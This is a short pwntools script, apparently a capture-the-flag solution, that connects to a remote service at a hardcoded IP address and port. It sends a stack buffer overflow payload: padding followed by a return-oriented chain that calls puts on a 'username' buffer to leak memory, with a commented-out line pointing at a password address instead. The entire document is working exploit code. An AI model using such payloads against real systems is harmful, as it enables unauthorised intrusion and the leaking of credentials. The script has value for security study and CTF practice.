from pwn import *

context.binary = "chall"
s = remote("54.37.70.250", 2002)
s.sendafter(b": ",
  b"a"*0x28 + 
  p64(0x400b03) + # pop rdi
  p64(0x6010c0) + # username
  #p64(0x6010e0) + # password
  p64(0x4006a0)[:-1])  # puts
s.shutdown("send")
print(s.recvall())
